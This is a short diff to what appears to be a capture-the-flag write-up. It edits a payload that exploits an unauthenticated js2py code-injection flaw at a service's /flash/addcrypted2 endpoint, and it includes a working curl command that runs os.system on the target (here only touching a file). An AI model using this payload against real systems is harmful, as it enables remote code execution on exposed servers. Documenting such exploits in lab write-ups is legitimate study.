@@ -264,7 +264,7 @@ PORT     STATE SERVICE VERSION
 According with this https://vulners.com/huntr/3FD606F7-83E1-4265-B083-2E1889A05E65 we can attack this service unauthenticated. we can inject arbitrary code abusing `js2py` funtionality due the lack of CSRF protection, a victim can be tricked to execute arbitrary python code.
 
 
-so we can try to import a payload `pyimport os;os.system("touch /tmp/nice_job");f=function f2(){};;&package=xxx&crypted=AAAA&&passwords=aaaa'`
+so we can try to import a payload `pyimport os;os.system("touch /tmp/nice_job");f=function f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'`
 
 ```
 curl -X POST 127.0.0.1:8000/flash/addcrypted2 -d 'jk=pyimport%20os;os.system(%22touch%20/tmp/nice_job%22);f=function%20f2()%7B%7D;&package=xxx&crypted=AAAA&&passwords=aaaa'`
